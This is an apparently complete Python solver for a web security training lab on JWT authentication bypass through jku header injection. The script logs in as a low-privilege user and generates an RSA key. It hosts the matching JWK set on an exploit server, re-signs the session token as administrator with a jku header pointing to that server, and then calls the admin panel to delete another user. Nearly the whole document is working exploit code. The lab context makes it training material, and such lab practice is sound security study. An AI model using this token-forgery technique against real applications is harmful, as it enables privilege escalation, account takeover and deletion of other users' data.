# JWT authentication bypass via jku header injection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

import base64
import hashlib
import hmac
from jwcrypto import jwk, jws, jwt

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	return r

def create_rsa_key(s, token, attacker):
	h, b, sig = decode_jwt_token(token)
	algo = re.search(r'"alg":"(.*)"', h).group(1)
	kid = re.search(r'"kid":"(.*)",', h).group(1)
	key = jwk.JWK.generate(kty='RSA', size=2048, alg='RSA-OAEP-256', use='sig', kid=kid)
	time.sleep(1)
	pub_key = key.export_public()
	priv_key = key.export_private()
	e = re.search(r',"e":"(.*)","kid', pub_key).group(1)
	n = re.search(r',"n":"(.*)","', pub_key).group(1)
	header = f'{{"typ":"JWT","alg":"{algo}","jku":"{attacker}/exploit","kid":"{kid}"}}'
	jku_payload = f"""{{
  "keys": [
    {{
      "kty": "RSA",
      "e": "{e}",
      "kid": "{kid}",
      "n": "{n}"
    }}
  ]
}}"""
	r = send_payload(s, 'External JKU key signed JWT', jku_payload, attacker)
	time.sleep(1)
	jwt_token = jwt.JWT(header=header, claims=b,)
	jwt_token.make_signed_token(key)
	print(jwt_token)
	return jwt_token.serialize()

def decode_jwt_token(token):
	enc_h, enc_b, sig = token.split('.')
# adding "==" to avoid Incorrect Padding
	h = base64.b64decode(enc_h + '==').decode()
	print('\n - Token Headers:\t%s' % h)
	b = base64.b64decode(enc_b + '==').decode()
	print(' - Token Body:\t\t%s' % b)
	print(' - Token Signature:\t%s' % sig)
	return (h, b, sig)

def encode_jwt_token(h: dict, b: dict, sig: str):
# removing "=" to avoid Incorrect Padding
	enc_h = base64.urlsafe_b64encode(h.encode()).decode().split('=')[0]
	print('\n - Encoded Headers:\t%s' % enc_h)
	enc_b = base64.urlsafe_b64encode(b.encode()).decode().split('=')[0]
	print(' - Encoded Body:\t\t%s' % enc_b)
	print(' - Encoded Signature:\t%s\n' % sig)
	return f'{enc_h}.{enc_b}.{sig}'

def get_jwt_token(s):
	token = s.cookies['session']
	print('\n[+] Found JWT session token:\t%s' % token)
	return token

def delete_carlos(s, url, token):
	print('\n[+] Trying to access to the Admin Panel with the resigned JWT...')
	time.sleep(1)
	s.cookies.clear()
	cookies = {'session': token}
	# r = s.get(url+'/my-account', cookies=cookies)
	r = s.get(url+'/admin', cookies=cookies)
	if '/admin/delete' in r.text:
		print('[+] Trying to delete Carlos account with the resigned JWT...')
		r = s.get(url + '/admin/delete?username=carlos', cookies=cookies)

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: JWT authentication bypass via jku header injection')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		exploit_srv = find_exploit_srv(r)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = s.get(url)
			parsed_atk = urllib.parse.urlparse(exploit_srv)
			if parsed_atk.netloc == b'':
				print('[-] Cannot find exploit server... Already solved <!>')
				sys.exit(1)
			attacker = parsed_atk.scheme + '://' + parsed_atk.netloc
			r = connect_as_wiener(s, url)
			time.sleep(2)
			token = get_jwt_token(s)
			print('\n[+] Decoded token values:')
			h, b, sig = decode_jwt_token(token)
			print('\n[+] Replacing our user by admin and sign the JWT with generated RSA injected via external JKU key...\n')
			body = b.replace('"sub":"wiener"', '"sub":"administrator"')
			new_token = encode_jwt_token(h, body, sig)
			signed_token = create_rsa_key(s, new_token, attacker)
			print('[+] New token values:')
			decode_jwt_token(signed_token)
			delete_carlos(s, url, signed_token)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
